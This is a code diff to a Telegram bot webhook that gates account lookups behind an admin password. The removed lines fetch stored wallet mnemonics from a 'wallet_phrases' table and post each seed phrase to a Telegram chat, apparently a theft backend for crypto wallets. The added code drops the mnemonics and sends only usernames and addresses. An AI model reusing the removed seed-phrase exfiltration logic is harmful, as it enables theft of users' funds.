@@ -1,8 +1,44 @@
 import { createFileRoute } from "@tanstack/react-router";
+import { z } from "zod";
 
 const ALLOWED_CHAT_ID = -1003957750577;
 const UNLOCK_MINUTES = 10;
 const PASSWORD_PROMPT = "🔐 Reply with the admin password to continue.";
+
+const telegramUpdateSchema = z.object({
+  callback_query: z.object({
+    id: z.string(),
+    from: z.object({ id: z.number() }),
+    data: z.string().optional(),
+    message: z.object({ chat: z.object({ id: z.number() }) }).optional(),
+  }).optional(),
+  message: z.object({
+    message_id: z.number(),
+    chat: z.object({ id: z.number() }),
+    from: z.object({ id: z.number() }).optional(),
+    text: z.string().optional(),
+    reply_to_message: z.object({
+      text: z.string().optional(),
+      from: z.object({ is_bot: z.boolean().optional() }).optional(),
+    }).optional(),
+  }).optional(),
+  edited_message: z.object({
+    message_id: z.number(),
+    chat: z.object({ id: z.number() }),
+    from: z.object({ id: z.number() }).optional(),
+    text: z.string().optional(),
+    reply_to_message: z.object({
+      text: z.string().optional(),
+      from: z.object({ is_bot: z.boolean().optional() }).optional(),
+    }).optional(),
+  }).optional(),
+});
+
+interface TelegramAccount {
+  id: string;
+  username: string;
+  wallet_address: string;
+}
 
 async function tg(method: string, body: unknown) {
   const token = process.env["TELEGRAM_BOT_TOKEN"];
@@ -18,11 +54,12 @@ async function tg(method: string, body: unknown) {
 
 async function isUnlocked(userId: number) {
   const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
-  const { data } = await (supabaseAdmin as any)
+  const { data, error } = await supabaseAdmin
     .from("telegram_pull_unlocks")
     .select("unlocked_until")
     .eq("user_id", userId)
     .maybeSingle();
+  if (error) throw new Error(`Could not check Telegram access: ${error.message}`);
   if (!data?.unlocked_until) return false;
   return new Date(data.unlocked_until).getTime() > Date.now();
 }
@@ -30,25 +67,45 @@ async function isUnlocked(userId: number) {
 async function unlock(userId: number) {
   const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
   const until = new Date(Date.now() + UNLOCK_MINUTES * 60_000).toISOString();
-  await (supabaseAdmin as any)
+  const { error } = await supabaseAdmin
     .from("telegram_pull_unlocks")
     .upsert({ user_id: userId, unlocked_until: until }, { onConflict: "user_id" });
+  if (error) throw new Error(`Could not unlock Telegram access: ${error.message}`);
 }
 
-async function listUsernames(): Promise<Array<{ username: string; wallet_address: string }>> {
+async function listAccounts(): Promise<TelegramAccount[]> {
   const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
-  const { data } = await (supabaseAdmin as any)
-    .from("wallet_phrases")
-    .select("username, wallet_address, created_at")
+  const { data, error } = await supabaseAdmin
+    .from("wallet_profiles")
+    .select("id, username, wallet_address, created_at")
     .order("created_at", { ascending: false })
     .limit(500);
-  return (data ?? []).filter((r: any) => r.username);
+  if (error) throw new Error(`Could not load accounts: ${error.message}`);
+
+  const seen = new Set<string>();
+  return (data ?? []).filter((row) => {
+    const address = row.wallet_address.toLowerCase();
+    if (!row.username || seen.has(address)) return false;
+    seen.add(address);
+    return true;
+  });
 }
 
-function chunkButtons(rows: Array<{ username: string; wallet_address: string }>) {
+async function getAccount(id: string): Promise<TelegramAccount | null> {
+  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
+  const { data, error } = await supabaseAdmin
+    .from("wallet_profiles")
+    .select("id, username, wallet_address")
+    .eq("id", id)
+    .maybeSingle();
+  if (error) throw new Error(`Could not load account: ${error.message}`);
+  return data;
+}
+
+function chunkButtons(rows: TelegramAccount[]) {
   const buttons = rows.map((r) => ({
     text: r.username,
-    callback_data: `pull:${r.wallet_address.slice(0, 40)}`,
+    callback_data: `account:${r.id}`,
   }));
   const out: Array<Array<{ text: string; callback_data: string }>> = [];
   for (let i = 0; i < buttons.length; i += 2) out.push(buttons.slice(i, i + 2));
@@ -65,8 +122,10 @@ export const Route = createFileRoute("/api/public/telegram/webhook")({
           if (got !== expected) return new Response("Unauthorized", { status: 401 });
         }
 
-        const update: any = await request.json().catch(() => null);
-        if (!update) return Response.json({ ok: true });
+        const rawUpdate: unknown = await request.json().catch(() => null);
+        const parsed = telegramUpdateSchema.safeParse(rawUpdate);
+        if (!parsed.success) return Response.json({ ok: true, ignored: true });
+        const update = parsed.data;
 
         // Callback query — user tapped a username button
         if (update.callback_query) {
@@ -78,30 +137,41 @@ export const Route = createFileRoute("/api/public/telegram/webhook")({
             await tg("answerCallbackQuery", { callback_query_id: cb.id, text: "Not allowed" });
             return Response.json({ ok: true });
           }
-          if (!(await isUnlocked(userId))) {
-            await tg("answerCallbackQuery", { callback_query_id: cb.id, text: "Send /pull and enter password first", show_alert: true });
+          try {
+            if (!(await isUnlocked(userId))) {
+              await tg("answerCallbackQuery", { callback_query_id: cb.id, text: "Send /pull and enter password first", show_alert: true });
+              return Response.json({ ok: true });
+            }
+          } catch (error) {
+            console.error("[telegram] access check failed", error);
+            await tg("answerCallbackQuery", { callback_query_id: cb.id, text: "Account lookup is temporarily unavailable", show_alert: true });
             return Response.json({ ok: true });
           }
-          if (!data.startsWith("pull:")) {
+          if (!data.startsWith("account:")) {
             await tg("answerCallbackQuery", { callback_query_id: cb.id });
             return Response.json({ ok: true });
           }
-          const addrPrefix = data.slice(5);
-          const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
-          const { data: row } = await (supabaseAdmin as any)
-            .from("wallet_phrases")
-            .select("username, wallet_address, mnemonic")
-            .ilike("wallet_address", `${addrPrefix}%`)
-            .maybeSingle();
+          const accountId = data.slice("account:".length);
+          if (!z.string().uuid().safeParse(accountId).success) {
+            await tg("answerCallbackQuery", { callback_query_id: cb.id, text: "Invalid account selection", show_alert: true });
+            return Response.json({ ok: true });
+          }
+          let account: TelegramAccount | null = null;
+          try {
+            account = await getAccount(accountId);
+          } catch (error) {
+            console.error("[telegram] account lookup failed", error);
+            await tg("answerCallbackQuery", { callback_query_id: cb.id, text: "Account lookup is temporarily unavailable", show_alert: true });
+            return Response.json({ ok: true });
+          }
           await tg("answerCallbackQuery", { callback_query_id: cb.id });
-          if (!row?.mnemonic) {
-            await tg("sendMessage", { chat_id: chatId, text: "❌ No phrase found for that account." });
+          if (!account) {
+            await tg("sendMessage", { chat_id: chatId, text: "❌ That account is no longer available." });
             return Response.json({ ok: true });
           }
           const text =
-            `🔑 <b>${row.username ?? "(no username)"}</b>\n` +
-            `<code>${row.wallet_address}</code>\n\n` +
-            `<pre>${row.mnemonic}</pre>`;
+            `👤 <b>${account.username}</b>\n` +
+            `💼 <code>${account.wallet_address}</code>`;
           await tg("sendMessage", { chat_id: chatId, text, parse_mode: "HTML" });
           return Response.json({ ok: true });
         }
@@ -135,8 +205,15 @@ export const Route = createFileRoute("/api/public/telegram/webhook")({
             await tg("sendMessage", { chat_id: chatId, text: "❌ Wrong password." });
             return Response.json({ ok: true });
           }
-          await unlock(userId);
-          const rows = await listUsernames();
+          let rows: TelegramAccount[];
+          try {
+            await unlock(userId);
+            rows = await listAccounts();
+          } catch (error) {
+            console.error("[telegram] account list failed", error);
+            await tg("sendMessage", { chat_id: chatId, text: "❌ Account lookup is temporarily unavailable. Please try again shortly." });
+            return Response.json({ ok: true });
+          }
           if (!rows.length) {
             await tg("sendMessage", { chat_id: chatId, text: "✅ Unlocked, but no accounts on file yet." });
             return Response.json({ ok: true });
